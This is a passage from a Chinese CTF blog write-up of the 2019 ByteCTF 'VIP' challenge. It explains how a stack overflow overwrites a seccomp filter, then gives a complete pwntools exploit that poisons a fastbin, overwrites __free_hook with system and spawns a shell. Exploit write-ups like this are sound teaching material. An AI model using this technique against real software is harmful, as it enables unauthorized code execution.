<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(read), <span class="number">2</span>, </span><br><span class="line">				SCMP_A0(SCMP_CMP_EQ, STDIN_FILENO), </span><br><span class="line">                SCMP_A2(SCMP_CMP_EQ, <span class="number">100</span>))</span><br></pre></td></tr></table></figure>
<p>seccomp_load&#x662F;&#x5E94;&#x7528;&#x8FC7;&#x6EE4;&#xFF0C;seccomp_reset&#x662F;&#x89E3;&#x9664;&#x8FC7;&#x6EE4;&#x3002;</p>
<h2 id="0x04-2019ByteCTF-VIP"><a href="#0x04-2019ByteCTF-VIP" class="headerlink" title="0x04 2019ByteCTF VIP"></a>0x04 2019ByteCTF VIP</h2><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">Arch:</span>     <span class="string">amd64-64-little</span></span><br><span class="line"><span class="attr">RELRO:</span>    <span class="string">Partial</span> <span class="string">RELRO</span></span><br><span class="line"><span class="attr">Stack:</span>    <span class="string">Canary</span> <span class="string">found</span></span><br><span class="line"><span class="attr">NX:</span>       <span class="string">NX</span> <span class="string">enabled</span></span><br><span class="line"><span class="attr">PIE:</span>      <span class="literal">No</span> <span class="string">PIE</span> <span class="string">(0x400000)</span></span><br></pre></td></tr></table></figure>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>.alloc</span><br><span class="line"><span class="number">2</span>.show</span><br><span class="line"><span class="number">3</span>.free</span><br><span class="line"><span class="number">4</span>.edit</span><br><span class="line"><span class="number">5</span>.exit</span><br><span class="line"><span class="number">6</span><span class="selector-class">.become</span> vip</span><br></pre></td></tr></table></figure>
<p>4.edit&#x5B58;&#x5728;&#x5806;&#x6EA2;&#x51FA;&#xFF0C;&#x53EF;&#x4EE5;&#x8986;&#x76D6;&#x4EFB;&#x610F;&#x5927;&#x5C0F;&#x6570;&#x636E;&#xFF0C;&#x4F46;&#x662F;&#x5185;&#x5BB9;&#x4E0D;&#x53EF;&#x63A7;</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( dword_4040E0 )</span><br><span class="line">  return read(<span class="number">0</span>, a1, a2);</span><br><span class="line">fd = open(<span class="string">&quot;/dev/urandom&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> ( fd == -<span class="number">1</span> )</span><br><span class="line">  <span class="keyword">exit</span>(<span class="number">0</span>);</span><br><span class="line">return read(fd, a1, a2);</span><br></pre></td></tr></table></figure>
<p>6.become vip&#x51FD;&#x6570;&#x5B58;&#x5728;&#x6808;&#x6EA2;&#x51FA;&#xFF0C;buf&#x5927;&#x5C0F;&#x4E3A;0x20&#x4E2A;&#x5B57;&#x8282;</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> buf; <span class="comment">// [rsp+10h] [rbp-80h]</span></span><br><span class="line"><span class="keyword">char</span> v4; <span class="comment">// [rsp+30h] [rbp-60h]</span></span><br></pre></td></tr></table></figure>
<p>&#x4F46;&#x662F;&#x53EF;&#x4EE5;&#x8F93;&#x5165;0x50&#x5B57;&#x8282;&#x6570;&#x636E;</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">read(<span class="number">0</span>, &amp;buf, <span class="number">0x50</span>uLL);</span><br></pre></td></tr></table></figure>
<p>&#x8BE5;&#x51FD;&#x6570;&#x4E2D;&#x5B58;&#x5728;seccomp&#x7684;&#x7CFB;&#x7EDF;&#x8C03;&#x7528;&#x8FC7;&#x6EE4;</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( prctl(<span class="number">22</span>, <span class="number">2L</span>L, &amp;v1) &lt; <span class="number">0</span> )</span><br><span class="line">{</span><br><span class="line">  perror(<span class="string">&quot;prctl(PR_SET_SECCOMP)&quot;</span>);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">2</span>);</span><br><span class="line">}</span><br></pre></td></tr></table></figure>
<p>v1&#x5C31;&#x662F;&#x4E0A;&#x9762;&#x8BF4;&#x7684;sock_fprog&#x7ED3;&#x6784;&#x4F53;&#xFF0C;&#x90A3;&#x4E48;v2&#x5C31;&#x662F;&#x6307;&#x5411;BPF&#x7ED3;&#x6784;&#x4F53;filter&#x7684;&#x6307;&#x9488;</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">__int16 v1; <span class="comment">// [rsp+0h] [rbp-90h]</span></span><br><span class="line"><span class="keyword">char</span> *v2; <span class="comment">// [rsp+8h] [rbp-88h]</span></span><br><span class="line"><span class="keyword">char</span> buf; <span class="comment">// [rsp+10h] [rbp-80h]</span></span><br><span class="line"><span class="keyword">char</span> v4; <span class="comment">// [rsp+30h] [rbp-60h]</span></span><br></pre></td></tr></table></figure>
<p>&#x67E5;&#x770B;&#x4E0B;&#x9762;&#x7684;&#x8D4B;&#x503C;</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">v1 = <span class="number">11</span>;</span><br><span class="line">v2 = &amp;v4;</span><br></pre></td></tr></table></figure>
<p>&#x89C4;&#x5219;&#x6761;&#x6570;&#x4E3A;11&#x4E2A;&#xFF0C;filter&#x6307;&#x9488;&#x6307;&#x5411;v4&#xFF0C;buf&#x53EF;&#x4EE5;&#x6EA2;&#x51FA;&#x5230;v4</p>
<h3 id="&#x601D;&#x8DEF;"><a href="#&#x601D;&#x8DEF;" class="headerlink" title="&#x601D;&#x8DEF;"></a>&#x601D;&#x8DEF;</h3><p>&#x8986;&#x76D6;BPF&#x8FC7;&#x6EE4;&#x89C4;&#x5219;&#xFF0C;&#x8BA9;open&#x7684;&#x8FD4;&#x56DE;&#x503C;&#x4E3A;0&#xFF0C;&#x90A3;&#x4E48;&#x5728;edit&#x529F;&#x80FD;&#x4E2D;&#xFF0C;read(fd, a1, a2)&#xFF0C;&#x5C31;&#x53D8;&#x6210;&#x4E86;read(0, a1, a2)&#xFF0C;&#x4ECE;&#x800C;&#x5806;&#x6EA2;&#x51FA;&#x5185;&#x5BB9;&#x53EF;&#x63A7;&#xFF0C;&#x7136;&#x540E;&#x5C31;&#x5E38;&#x89C4;&#x7684;getshell&#x601D;&#x8DEF;&#x3002;</p>
<h3 id="&#x95EE;&#x9898;&#x4E0E;&#x89E3;&#x51B3;"><a href="#&#x95EE;&#x9898;&#x4E0E;&#x89E3;&#x51B3;" class="headerlink" title="&#x95EE;&#x9898;&#x4E0E;&#x89E3;&#x51B3;"></a>&#x95EE;&#x9898;&#x4E0E;&#x89E3;&#x51B3;</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$rax   : <span class="number">0x101</span>             </span><br><span class="line">......</span><br><span class="line">&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500; <span class="built_in">stack</span> &#x2500;&#x2500;&#x2500;&#x2500;</span><br><span class="line"><span class="number">0x00007fffffffde90</span>&#x2502;+<span class="number">0x0000</span>: <span class="number">0x0000000000000000</span>	 &#x2190; $rsp</span><br><span class="line">......</span><br><span class="line">&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500; code:x86:<span class="number">64</span> &#x2500;&#x2500;&#x2500;&#x2500;</span><br><span class="line">   <span class="number">0x7ffff7af3c87</span> &lt;open64+<span class="number">71</span>&gt;      mov    edi, <span class="number">0xffffff9c</span></span><br><span class="line"> &#x2192; <span class="number">0x7ffff7af3c8c</span> &lt;open64+<span class="number">76</span>&gt;      syscall </span><br><span class="line">......</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat /usr/include/x86_64-linux-gnu/<span class="keyword">asm</span>/unistd_64.h|grep <span class="number">257</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_openat 257</span></span><br></pre></td></tr></table></figure>
<p>open&#x51FD;&#x6570;&#x4F7F;&#x7528;&#x7684;&#x662F;openat&#x7CFB;&#x7EDF;&#x8C03;&#x7528;</p>
<p>&#x4F7F;&#x7528;<a href="https://github.com/david942j/seccomp-tools" target="_blank" rel="noopener">seccomp-tools</a>&#x751F;&#x6210;&#x89C4;&#x5219;&#xFF0C;&#x4E00;&#x6761;&#x89C4;&#x5219;&#x662F;8&#x4E2A;&#x5B57;&#x8282;&#xFF0C;&#x53EF;&#x4EE5;&#x6EA2;&#x51FA;48&#x4E2A;&#x5B57;&#x8282;&#xFF0C;&#x6839;&#x636E;seccomp-tools&#x4F7F;&#x7528;&#x8BF4;&#x660E;&#xFF0C;&#x7F16;&#x5199;&#x89C4;&#x5219;</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#cat 1.asm</span></span><br><span class="line">A = sys_number</span><br><span class="line">A == <span class="number">257</span>? e0:next</span><br><span class="line">A == <span class="number">1</span>? ok:next</span><br><span class="line"><span class="keyword">return</span> ALLOW</span><br><span class="line">e0:</span><br><span class="line"><span class="keyword">return</span> ERRNO(<span class="number">0</span>)</span><br><span class="line">ok:</span><br><span class="line"><span class="keyword">return</span> ALLOW</span><br></pre></td></tr></table></figure>
<p>&#x89C4;&#x5219;&#x5982;&#x4E0B;&#xFF1A;</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">#seccomp-tools asm 1.asm -f raw |seccomp-tools disasm -</span></span><br><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> <span class="number">0000</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  A = sys_number</span><br><span class="line"> <span class="number">0001</span>: <span class="number">0x15</span> <span class="number">0x02</span> <span class="number">0x00</span> <span class="number">0x00000101</span>  <span class="keyword">if</span> (A == openat) <span class="keyword">goto</span> <span class="number">0004</span></span><br><span class="line"> <span class="number">0002</span>: <span class="number">0x15</span> <span class="number">0x02</span> <span class="number">0x00</span> <span class="number">0x00000001</span>  <span class="keyword">if</span> (A == write) <span class="keyword">goto</span> <span class="number">0005</span></span><br><span class="line"> <span class="number">0003</span>: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x7fff0000</span>  <span class="keyword">return</span> ALLOW</span><br><span class="line"> <span class="number">0004</span>: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00050000</span>  <span class="keyword">return</span> ERRNO(<span class="number">0</span>)</span><br><span class="line"> <span class="number">0005</span>: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x7fff0000</span>  <span class="keyword">return</span> ALLOW</span><br></pre></td></tr></table></figure>
<p>&#x751F;&#x6210;16&#x8FDB;&#x5236;&#x5B57;&#x7B26;&#x4E32;</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#seccomp-tools asm 1.asm</span></span><br><span class="line"><span class="string">&quot;\x20\x00\x00\x00\x00\x00\x00\x00\x15\x00\x02\x00\x01\x01\x00\x00\x15\x00\x02\x00\x01\x00\x00\x00\x06\x00\x00\x00\x00\x00\xFF\x7F\x06\x00\x00\x00\x00\x00\x05\x00\x06\x00\x00\x00\x00\x00\xFF\x7F&quot;</span></span><br></pre></td></tr></table></figure>
<p>&#x5728;&#x540E;&#x7EED;&#x7684;&#x5229;&#x7528;&#x4E2D;&#xFF0C;&#x53EF;&#x4EE5;&#x6B63;&#x5E38;&#x5411;&#x5806;&#x4E2D;&#x5199;&#x5165;&#x53EF;&#x63A7;&#x7684;&#x6570;&#x636E;&#xFF0C;&#x4F46;&#x662F;&#x65E0;&#x6CD5;getshell&#xFF0C;&#x62A5;&#x9519;&#xFF1A;</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sh: error <span class="keyword">while</span> loading shared libraries: /lib/x86_64-linux-gnu/tls/x86_64/x86_64/libc.so<span class="number">.6</span>: cannot read file data: Error <span class="number">9</span></span><br></pre></td></tr></table></figure>
<p>&#x68C0;&#x67E5;system&#x8C03;&#x7528;&#x53C2;&#x6570;&#x662F;&#x5BF9;&#x7684;&#xFF0C;&#x5728;huai&#x7684;&#x5E2E;&#x52A9;&#x4E0B;&#xFF0C;&#x6000;&#x7591;&#x53EF;&#x80FD;&#x662F;system&#x51FD;&#x6570;&#x8C03;&#x7528;&#x4E86;open&#x51FD;&#x6570;&#xFF0C;&#x56E0;&#x4E3A;&#x8FC7;&#x6EE4;&#x89C4;&#x5219;&#x5F71;&#x54CD;&#x4E86;open&#x7684;&#x6B63;&#x5E38;&#x4F7F;&#x7528;&#x3002;&#x5199;&#x4E00;&#x4E2A;&#x53EA;&#x6709;system(&#x201C;/bin/sh&#x201D;)&#x7684;c&#x7A0B;&#x5E8F;&#xFF0C;&#x67E5;&#x770B;&#x8C03;&#x7528;&#x8FC7;&#x7A0B;&#x53D1;&#x73B0;&#x6709;&#x8C03;&#x7528;openat&#x7684;&#x8FC7;&#x7A0B;&#x3002;</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#strace ./test</span></span><br><span class="line">execve(<span class="string">&quot;./system&quot;</span>, [<span class="string">&quot;./system&quot;</span>], <span class="number">0x7fff84f88350</span> <span class="comment">/* 52 vars */</span>) = <span class="number">0</span></span><br><span class="line">brk(<span class="literal">NULL</span>)                               = <span class="number">0x55bbaa268000</span></span><br><span class="line">access(<span class="string">&quot;/etc/ld.so.nohwcap&quot;</span>, F_OK)      = <span class="number">-1</span> ENOENT (No such file <span class="keyword">or</span> directory)</span><br><span class="line">access(<span class="string">&quot;/etc/ld.so.preload&quot;</span>, R_OK)      = <span class="number">-1</span> ENOENT (No such file <span class="keyword">or</span> directory)</span><br><span class="line">openat(AT_FDCWD, <span class="string">&quot;/etc/ld.so.cache&quot;</span>, O_RDONLY|O_CLOEXEC) = <span class="number">3</span></span><br><span class="line">fstat(<span class="number">3</span>, {st_mode=S_IFREG|<span class="number">0644</span>, st_size=<span class="number">74811</span>, ...}) = <span class="number">0</span></span><br><span class="line">mmap(<span class="literal">NULL</span>, <span class="number">74811</span>, PROT_READ, MAP_PRIVATE, <span class="number">3</span>, <span class="number">0</span>) = <span class="number">0x7f60d1b70000</span></span><br><span class="line">close(<span class="number">3</span>)                                = <span class="number">0</span></span><br><span class="line">access(<span class="string">&quot;/etc/ld.so.nohwcap&quot;</span>, F_OK)      = <span class="number">-1</span> ENOENT (No such file <span class="keyword">or</span> directory)</span><br><span class="line">openat(AT_FDCWD, <span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>, O_RDONLY|O_CLOEXEC) = <span class="number">3</span></span><br><span class="line">......</span><br></pre></td></tr></table></figure>
<p>&#x91CD;&#x65B0;&#x7F16;&#x5199;&#x8FC7;&#x6EE4;&#x89C4;&#x5219;&#xFF0C;&#x9650;&#x5236;&#x6253;&#x5F00;&#x7684;&#x6587;&#x4EF6;&#xFF0C;&#x8FDB;&#x884C;&#x8FC7;&#x6EE4;&#xFF0C;&#x4E0D;&#x5F71;&#x54CD;system&#x7684;&#x6B63;&#x5E38;&#x4F7F;&#x7528;&#x3002;</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#man openat</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">openat</span><span class="params">(<span class="keyword">int</span> dirfd, <span class="keyword">const</span> <span class="keyword">char</span> *pathname, <span class="keyword">int</span> flags)</span></span>;</span><br></pre></td></tr></table></figure>
<p>&#x53EF;&#x4EE5;&#x770B;&#x5230;&#x5728;openat&#x7684;&#x539F;&#x578B;&#x4E2D;&#xFF0C;&#x7B2C;&#x4E8C;&#x4E2A;&#x53C2;&#x6570;&#x662F;&#x8981;&#x6253;&#x5F00;&#x7684;&#x6587;&#x4EF6;&#x540D;&#x5B57;&#x7B26;&#x4E32;&#x6307;&#x9488;&#xFF0C;&#x6240;&#x4EE5;&#x8981;&#x9650;&#x5236;&#x7B2C;&#x4E8C;&#x4E2A;&#x53C2;&#x6570;&#xFF0C;&#x7A0B;&#x5E8F;&#x4E2D;0x40207e&#x5B58;&#x653E;&#x7684;&#x662F;/dev/urandom&#x7684;&#x5730;&#x5740;&#x3002;&#x89C4;&#x5219;&#x5982;&#x4E0B;</p>
<figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#cat 2.asm</span></span><br><span class="line">A = sys_number</span><br><span class="line">A != 257 ? ok : next</span><br><span class="line">A = args[1]</span><br><span class="line">A != 0x40207e ? ok:next </span><br><span class="line">return ERRNO(0)</span><br><span class="line"><span class="section">ok:</span></span><br><span class="line">return ALLOW</span><br></pre></td></tr></table></figure>
<p>&#x751F;&#x6210;&#x5341;&#x516D;&#x8FDB;&#x5236;&#x540E;&#x8986;&#x76D6;&#x89C4;&#x5219;&#xFF0C;&#x53EF;&#x4EE5;&#x6B63;&#x5E38;getshell&#x3002;</p>
<h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&quot;./vip&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./vip&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&apos;./libc.so.6&apos;</span>)</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(index)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">&apos;choice: &apos;</span>, <span class="string">&apos;1&apos;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&apos;Index: &apos;</span>, str(index))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index, size, content)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">&apos;choice: &apos;</span>, <span class="string">&apos;4&apos;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&apos;Index: &apos;</span>, str(index))</span><br><span class="line">    p.sendlineafter(<span class="string">&apos;Size: &apos;</span>, str(size))</span><br><span class="line">    p.sendafter(<span class="string">&apos;Content: &apos;</span>, content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(index)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">&apos;choice: &apos;</span>, <span class="string">&apos;3&apos;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&apos;Index: &apos;</span>, str(index))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(index)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">&apos;choice: &apos;</span>, <span class="string">&apos;2&apos;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&apos;Index: &apos;</span>, str(index))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">q</span><span class="params">()</span>:</span></span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    raw_input(<span class="string">&quot;pause&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span><span class="params">()</span>:</span></span><br><span class="line">    filter0 = <span class="string">&quot;\x20\x00\x00\x00\x00\x00\x00\x00\x15\x00\x00\x03\x01\x01\x00\x00 \x00\x00\x00\x18\x00\x00\x00\x15\x00\x00\x01~ @\x00\x06\x00\x00\x00\x00\x00\x05\x00\x06\x00\x00\x00\x00\x00\xFF\x7F&quot;</span></span><br><span class="line">    p.sendlineafter(<span class="string">&apos;choice: &apos;</span>, <span class="string">&apos;6&apos;</span>)</span><br><span class="line">    p.sendafter(<span class="string">&apos;name: &apos;</span>, <span class="string">&apos;a&apos;</span> * <span class="number">32</span> + filter0)</span><br><span class="line"></span><br><span class="line">    add(<span class="number">0</span>)</span><br><span class="line">    add(<span class="number">1</span>)</span><br><span class="line">    add(<span class="number">2</span>)</span><br><span class="line">    add(<span class="number">3</span>)</span><br><span class="line">    delete(<span class="number">3</span>)</span><br><span class="line">    delete(<span class="number">2</span>)</span><br><span class="line">    delete(<span class="number">1</span>)</span><br><span class="line">    edit(<span class="number">0</span>,<span class="number">0x50</span>+<span class="number">0x20</span>,<span class="string">&quot;\x00&quot;</span>*<span class="number">0x58</span>+p64(<span class="number">0x61</span>)+p64(<span class="number">0x404100</span>))</span><br><span class="line">    add(<span class="number">4</span>)</span><br><span class="line">    add(<span class="number">5</span>)</span><br><span class="line">    edit(<span class="number">5</span>,<span class="number">0x8</span>,p64(elf.got[<span class="string">&apos;puts&apos;</span>]))</span><br><span class="line">    show(<span class="number">0</span>)</span><br><span class="line">    libc.address = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&apos;\x00&apos;</span>)) - libc.sym[<span class="string">&apos;puts&apos;</span>]</span><br><span class="line">    log.info(<span class="string">&quot;libc_base:&quot;</span>+hex(libc.address))</span><br><span class="line">    edit(<span class="number">5</span>,<span class="number">0x10</span>,p64(libc.sym[<span class="string">&apos;__free_hook&apos;</span>])+p64(libc.search(<span class="string">&apos;/bin/sh&apos;</span>).next()))</span><br><span class="line">    edit(<span class="number">0</span>,<span class="number">0x8</span>,p64(libc.sym[<span class="string">&apos;system&apos;</span>]))</span><br><span class="line">    delete(<span class="number">1</span>)</span><br><span class="line">    p.interactive()</span><br><span class="line">pwn()</span><br></pre></td></tr></table></figure>
<h2 id="0x05-REFERENCE"><a href="#0x05-REFERENCE" class="headerlink" title="0x05 REFERENCE"></a>0x05 REFERENCE</h2><ol>
<li><a href="https://www.cnblogs.com/hymenz/p/7798543.html" target="_blank" rel="noopener">https://www.cnblogs.com/hymenz/p/7798543.html</a></li>
<li><a href="http://blog.jingwei.site/2018/10/31/seccomp&#x7684;&#x4F7F;&#x7528;/" target="_blank" rel="noopener">http://blog.jingwei.site/2018/10/31/seccomp%E7%9A%84%E4%BD%BF%E7%94%A8/</a></li>
<li><a href="https://darkwing.moe/2019/08/08/seccomp/" target="_blank" rel="noopener">https://darkwing.moe/2019/08/08/seccomp/</a></li>
<li><a href="https://veritas501.space/2018/05/05/seccomp&#x5B66;&#x4E60;&#x7B14;&#x8BB0;/" target="_blank" rel="noopener">https://veritas501.space/2018/05/05/seccomp%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</a></li>
<li><a href="https://tech.liuchao.me/2016/05/online-judge-sandbox-design-2/" target="_blank" rel="noopener">https://tech.liuchao.me/2016/05/online-judge-sandbox-design-2/</a></li>
<li><a href="https://www.cnblogs.com/hymenz/p/7798543.html" target="_blank" rel="noopener">https://www.cnblogs.com/hymenz/p/7798543.html</a></li>
<li><a href="http://www.360doc.com/content/06/1026/17/13362_241408.shtml" target="_blank" rel="noopener">http://www.360doc.com/content/06/1026/17/13362_241408.shtml</a></li>
<li><a href="https://blog.betamao.me/2019/01/23/Linux&#x6C99;&#x7BB1;&#x4E4B;seccomp/" target="_blank" rel="noopener">https://blog.betamao.me/2019/01/23/Linux%E6%B2%99%E7%AE%B1%E4%B9%8Bseccomp/</a></li>
<li><a href="https://www.zybuluo.com/H4l0/note/1546081" target="_blank" rel="noopener">https://www.zybuluo.com/H4l0/note/1546081</a></li>
<li><a href="https://xz.aliyun.com/t/6305#toc-10" target="_blank" rel="noopener">https://xz.aliyun.com/t/6305#toc-10</a></li>
</ol>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2019/06/25/2019-SCTF-easy-heap-fastbin-attack/">2019-SCTF-easy_heap[fastbin attack]</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2019-06-25</time><span class="article-meta"><span class="article-meta__separator">|</span><i class="fa fa-inbox article-meta__icon" aria-hidden="true"></i><a class="article-meta__categories" href="/categories/heap/">heap</a></span><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/fastbin-attack/">fastbin attack</a></span><div class="content"><h2 id="0x00-&#x7A0B;&#x5E8F;&#x5206;&#x6790;"><a href="#0x00-&#x7A0B;&#x5E8F;&#x5206;&#x6790;" class="headerlink" title="0x00 &#x7A0B;&#x5E8F;&#x5206;&#x6790;"></a>0x00 &#x7A0B;&#x5E8F;&#x5206;&#x6790;</h2><p>2.23&#x7248;&#x672C;&#x7684;libc&#xFF0C;&#x4FDD;&#x62A4;&#x5168;&#x5F00;</p>
